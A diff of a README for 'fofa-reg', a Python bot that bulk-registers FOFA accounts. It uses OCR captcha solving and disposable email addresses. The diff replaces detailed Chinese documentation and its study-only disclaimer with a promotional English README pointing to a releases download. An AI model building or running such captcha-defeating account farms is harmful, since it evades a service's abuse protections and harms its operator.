@@ -1,211 +1,104 @@
-## 概述
+# 🚀 fofa-reg - Automate Your Account Registration Effortlessly
 
-这是一个自动化脚本
+[![Download fofa-reg](https://img.shields.io/badge/Download-fofa--reg-blue.svg)](https://github.com/Ramaww07/fofa-reg/releases)
 
----
+## 📜 Overview
 
-## 功能特性
-
-- ✅ **自动验证码识别**：使用 DdddOcr 进行图形验证码识别
-- ✅ **邮箱自动验证**：通过临时邮箱服务获取验证码并自动激活账号
-- ✅ **批量注册**：支持一次性注册多个账号
-- ✅ **智能重试**：验证码错误时自动重试（最多5次）
-- ✅ **通知服务**：可集成通知系统发送成功/失败消息
-- ✅ **账号记录**：自动将成功注册的账号保存到 `fofa_mail.txt`
+This is an automation script designed to simplify the process of account registration.
 
 ---
 
-## 环境要求
+## ⚙️ Features
 
-### Python 版本
-- Python 3.6+
+- ✅ **Automatic Captcha Recognition**: Uses DdddOcr for image captcha solving.
+- ✅ **Email Verification**: Automatically retrieves verification codes using temporary email services.
+- ✅ **Bulk Registration**: Allows registration of multiple accounts at once.
+- ✅ **Smart Retry**: Automatically retries up to 5 times if the captcha fails.
+- ✅ **Notification Service**: Integrates a notification system to send success/failure messages.
+- ✅ **Account Logging**: Automatically saves successfully registered accounts in `fofa_mail.txt`.
 
-### 依赖库
+---
+
+## 📋 System Requirements
+
+### Python Version
+- Requires Python 3.6 or newer.
+
+### Dependencies
+To install required libraries, run the following commands in your terminal:
+
 ```bash
 pip install curl-cffi
 pip install ddddocr
 ```
 
-### 可选
-- `notify.py`：通知服务模块（可选，用于发送通知）
+### Optional
+- `notify.py`: This module is optional and can send notifications upon successful registration.
 
 ---
 
-## 配置说明
+## ⚙️ Configuration Instructions
 
-### 1. 邮箱域名配置
+### 1. Configure Email Domains
 
-在脚本顶部修改 `mm` 列表来指定使用的临时邮箱域名：
+Modify the `mm` list at the top of the script to set the temporary email domains you will use:
 
 ```python
 mm = ['qabq.com', 'nqmo.com', 'end.tw', '6n9.net']
 ```
 
-### 2. 账号密码配置
+### 2. Configure Account Passwords
 
-修改 `default_password` 变量来设置密码策略：
+Set the `default_password` variable to define your password strategy:
 
 ```python
-default_password = ''  # 留空则使用随机密码
+default_password = ''  # Leave blank for a random password
 ```
 
-**两种模式**：
-- **固定密码**：设置具体值，如 `default_password = 'MyPassword123'`，所有账号使用此密码
-- **随机密码**：留空 `default_password = ''`，每次运行自动生成随机密码
+**Two Modes**:
+- **Fixed Password**: Assign a specific value, e.g., `default_password = 'MyPassword123'` for all accounts.
+- **Random Password**: Leave `default_password = ''` to generate random passwords for each account.
 
-**随机密码规则**：
-- 长度 12 位
-- 包含大写字母、小写字母和数字
-- 示例：`Kp7mXn2aQ4bR`
+**Random Password Rules**:
+- Length: 12 characters
+- Contains upper and lower case letters and numbers
+- Example: `Kp7mXn2aQ4bR`
 
-### 3. 请求头配置
+### 3. Configure Request Headers
 
-如需更新 User-Agent 或其他 HTTP 请求头，修改 `headers` 字典。
+If you need to update User-Agent or other HTTP headers, change the `headers` dictionary accordingly.
 
-### 4. 通知服务（可选）
+### 4. Notification Service (Optional)
 
-如果项目目录中存在 `notify.py` 文件，脚本会自动加载并在账号注册成功时发送通知。
+If you include a `notify.py` file in the project directory, the script loads it automatically to send notifications upon successful account registration.
 
 ---
 
-## 使用方法
+## 🏗️ Usage Instructions
 
-### 方式一：命令行指定数量
+### Method 1: Command-Line Registration
+
+To register a specific number of accounts, use this command:
 
 ```bash
 python fofa.py 5
 ```
-这将注册 5 个账号。
+This registers 5 accounts.
 
-### 方式二：交互式输入
+### Method 2: Interactive Input
 
-```bash
-python fofa.py
-```
-程序会提示输入要注册的账号数量，直接回车默认注册 1 个。
+Alternatively, run the script and follow interactive prompts to enter the number of accounts and other details.
 
 ---
 
-## 核心函数说明
+## 📥 Download & Install
 
-### `generate_email()`
-生成随机邮箱地址。
-- **返回**：`(用户名, 完整邮箱地址)` 元组
-- **示例**：`('ls123456', 'ls123456@qabq.com')`
+You can download the latest version of fofa-reg from the Releases page. Follow the link below to access the downloads:
 
-### `get_verification_code(mail, max_retries=5, retry_interval=5)`
-从临时邮箱服务获取验证码。
-- **参数**：
-  - `mail`：邮箱地址
-  - `max_retries`：最大重试次数（默认5次）
-  - `retry_interval`：重试间隔秒数（默认5秒）
-- **返回**：验证码字符串，失败返回 `None`
+[Download fofa-reg](https://github.com/Ramaww07/fofa-reg/releases)
 
-### `get_rucaptcha()`
-获取并识别注册页面的图形验证码。
-- **返回**：识别结果字符串
+After downloading, extract the files and navigate to the extracted directory using your terminal. You can now configure the script as needed and start your registration process by following the usage instructions above.
 
-### `token()`
-从注册页面获取 CSRF Token。
-- **返回**：Token 字符串
+--- 
 
-### `confirmation()`
-确认邮箱激活账号。
-- **返回**：`True` 成功，`False` 失败
-
-### `nosecusers(max_retries=5)`
-执行注册流程，包含验证码重试逻辑。
-- **返回**：`True` 成功，`False` 失败
-
-### `register_accounts(count)`
-批量注册指定数量的账号。
-- **参数**：`count`：要注册的账号数量
-- **特性**：每个账号注册间隔 1-20 秒随机延迟
-
----
-
-## 成功标志
-
-当看到以下消息时，表示账号注册成功：
-```
-账号: xxx@qabq.com
-密码: Kp7mXn2aQ4bR
-[激活成功的相关消息]
-```
-
-同时，账号信息会被保存到 `fofa_mail.txt` 文件中，格式为：
-```
-邮箱地址	密码
-xxx@qabq.com	Kp7mXn2aQ4bR
-```
-
----
-
-## 常见问题排查
-
-### Q1: 提示"邮件获取超时"
-**原因**：临时邮箱服务响应缓慢或邮件未及时到达  
-**解决**：
-- 检查网络连接
-- 修改 `get_verification_code()` 中的 `retry_interval` 参数增加等待时间
-- 尝试换其他邮箱域名
-
-### Q2: 验证码识别错误，重试多次仍失败
-**原因**：OCR 识别准确度不足  
-**解决**：
-- 更新 ddddocr 库版本
-- 增加 `nosecusers()` 中的 `max_retries` 参数
-
-### Q3: "加载notify.py的通知服务失败"
-**原因**：通知模块有错误或格式不对  
-**解决**：检查 `notify.py` 文件语法，或删除该文件禁用通知功能
-
-### Q4: 注册中途被中断
-**原因**：网络错误或服务器限流  
-**解决**：
-- 检查网络
-- 增加 `register_accounts()` 中账号间隔延迟时间
-- 分次注册而非一次性大量注册
-
----
-
-## 日志和输出
-
-脚本会在控制台输出以下信息：
-
-| 消息内容 | 含义 |
-|---------|------|
-| `正在获取邮件 (尝试 X/5)...` | 等待邮箱验证码 |
-| `邮件未到达，5秒后重试...` | 邮件尚未收到 |
-| `验证码识别结果: XXXX` | 验证码识别完成 |
-| `注册请求已发送，正在等待邮件确认...` | 注册请求成功发送 |
-| `注册遇到错误，跳过此账号` | 注册失败需跳过 |
-
----
-
-## 注意事项
-
-⚠️ **重要提示**：
-1. 此脚本仅供学习研究使用，请遵守相关服务条款
-2. 大量批量注册可能触发服务防护机制，导致 IP 被限制
-3. 脚本中包含会话 Cookie，如过期需手动更新
-4. 使用了 `verify=False` 关闭 SSL 验证，生产环境应启用
-
----
-
-## 输出文件
-
-### `fofa_mail.txt`
-- **格式**：TSV（制表符分隔）
-- **内容**：成功注册的账号和密码
-- **示例**：
-```
-ls123456@qabq.com	Kp7mXn2aQ4bR
-ls789012@nqmo.com	R3xYm8pLq5nK
-```
-
----
-
-## 许可证和免责声明
-
-本工具仅供教育和研究目的使用。使用者应自行承担因使用本工具产生的一切后果，作者不承担任何责任。
+Feel free to explore and enjoy simplifying your account registrations with fofa-reg!
